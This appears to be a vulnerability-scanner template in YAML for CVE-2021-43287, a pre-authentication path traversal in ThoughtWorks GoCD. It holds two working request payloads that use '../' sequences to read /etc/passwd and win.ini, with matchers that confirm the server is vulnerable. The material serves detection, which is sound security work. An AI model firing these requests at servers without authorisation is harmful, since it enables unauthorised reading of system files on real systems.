id: yaml-poc-thoughtworks-gocd-leak-CVE-2021-43287
info:
  name: Yaml Poc Thoughtworks Gocd Leak Cve 2021 43287
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-thoughtworks-gocd-leak-CVE-2021-43287'
  tags: cve
  classification:
    cve-id: CVE-2021-43287
  reference:
  - http://wiki.hgsec.top/%E6%BC%8F%E6%B4%9E%E5%BA%93/GoCD/CVE-2021-43287%20GoCD%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/
  - https://blog.sonarsource.com/gocd-pre-auth-pipeline-takeover
  - https://cxsecurity.com/cveshow/CVE-2021-43287/
  - https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c
  - https://www.gocd.org/releases/#21-3-0
http:
- method: GET
  path:
  - /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
- method: GET
  path:
  - /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - for 16-bit app support
    - '[extensions]'
